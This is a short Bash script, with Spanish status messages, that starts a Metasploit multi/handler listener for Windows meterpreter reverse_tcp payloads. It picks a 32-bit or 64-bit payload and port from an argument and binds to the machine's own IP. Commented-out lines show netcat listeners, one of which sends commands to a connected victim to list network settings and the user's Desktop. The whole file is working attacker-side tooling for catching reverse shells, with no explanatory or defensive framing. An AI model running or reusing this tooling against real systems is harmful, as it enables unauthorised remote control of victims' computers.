#!/bin/bash

LBlue='\033[0;94m'      # Ligth Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Configurando la Reverse Shell...${Color_Off}\n"

arch=$1

#tput cnorm
HOST=$(ip route get 1 | awk '{print $7}')

#rlwrap nc -nlvp 4647
#echo -e 'ipconfig\ndir $env:USERPROFILE\Desktop\n' | nc -nlvp 4647

if [ $arch == "32bits" ] ; then
    echo "Iniciando handler de 32 bits"
    msfconsole -x "use multi/handler;set payload windows/meterpreter/reverse_tcp; set lhost $HOST; set lport 995; set ExitOnSession false; exploit -j"
fi

if [ $arch == "64bits" ] ; then
    echo "Iniciando handler de 64 bits"
    msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost $HOST; set lport 8443; set ExitOnSession false; exploit -j"
fi


